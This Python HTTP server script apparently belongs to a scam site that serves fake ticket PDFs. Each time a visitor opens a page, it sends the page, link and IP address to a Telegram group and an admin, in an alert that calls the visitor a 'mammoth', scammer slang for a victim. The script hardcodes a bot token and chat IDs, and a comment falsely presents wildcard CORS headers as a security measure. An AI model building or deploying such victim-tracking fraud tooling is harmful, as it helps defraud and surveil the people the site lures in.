#!/usr/bin/env python3
import http.server
import socketserver
import os
import sys
from urllib.parse import urlparse, unquote
import requests

# Настройки сервера
PORT = 80  # Стандартный HTTP порт
DIRECTORY = "."  # Папка с сайтом (корінь проекту)

def send_telegram_log(page, link, ip, country=""):
    BOT_TOKEN = "8055265032:AAHdP7_hwpJ--mzXYBQgbrJduxJ-uczEPGQ"
    GROUP_ID = -4851128750  # ваш group id
    ADMIN_ID = 7973971109   # ваш admin id
    msg = (
        f"⚠️ Мамонт открыл страницу\n"
        f"📄 Страница: {page}\n"
        f"🔗 Ссылка: {link}\n"
        f"🌍 IP: {ip}\n"
        f"🌏 Страна: {country}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_group = {"chat_id": GROUP_ID, "text": msg}
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    try:
        requests.post(url, data=data_group, timeout=2)
        requests.post(url, data=data_admin, timeout=2)
    except Exception as e:
        print(f"❌ Не вдалося надіслати лог у Telegram: {e}")

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # Добавляем CORS заголовки для безопасности
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()
    
    def do_GET(self):
        print(f"GET: {self.path}")  # Логування всіх GET-запитів
        path = unquote(self.path.split('?', 1)[0])
        orig_path = path
        # Якщо файл не знайдено, але є параметри — повертаємо index.html з відповідної папки
        fs_path = self.translate_path(path)
        if not os.path.exists(fs_path):
            if path.endswith('/'):
                path += 'index.html'
            elif not path.endswith('.html'):
                path += '/index.html'
            fs_path = self.translate_path(path)
            if os.path.exists(fs_path):
                self.path = path
        if orig_path.startswith('/file/ticket/'):
            filename = orig_path[len('/file/ticket/'):]
            ticket_path = os.path.join('tickets', filename)
            if os.path.exists(ticket_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'inline; filename="{filename}"')
                self.end_headers()
                with open(ticket_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, 'Ticket not found')
            return
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # Якщо це ресурс — не логувати
        if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
            return super().do_GET()
        # Нормалізуємо шлях для унікальності
        norm_path = orig_path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # Логувати тільки якщо це основна сторінка
        should_log = (
            norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
        )
        if should_log:
            if not hasattr(self.server, 'logged_paths'):
                self.server.logged_paths = set()
            if norm_path not in self.server.logged_paths:
                self.server.logged_paths.add(norm_path)
                print(f"📝 Логуємо відкриття сторінки: {norm_path}")
                send_telegram_log(
                    page=norm_path,
                    link=self.path,
                    ip=self.client_address[0]
                )
        try:
            super().do_GET()
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {e}")

    def do_POST(self):
        path = unquote(self.path.split('?', 1)[0])
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            import json
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = self.client_address[0]
                send_telegram_log(page=page, link=link, ip=ip)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    try:
        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"🌐 Сервер запущений на порту {PORT}")
            print(f"📁 Обслуговуємо папку: {DIRECTORY}")
            print(f"🔗 Сайт доступний за адресою: http://localhost:{PORT}/")
            httpd.serve_forever()
    except PermissionError:
        print(f"❌ Помилка: Немає прав для запуску на порту {PORT}")
        print("💡 Спробуйте запустити з правами адміністратора або використайте порт 8080")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"❌ Помилка: Порт {PORT} вже використовується")
            print("💡 Зупиніть інший сервер або використайте інший порт")
        else:
            print(f"❌ Помилка запуску сервера: {e}")
    except KeyboardInterrupt:
        print("\n⏹️ Сервер зупинений користувачем")
    except Exception as e:
        print(f"❌ Неочікувана помилка: {e}") 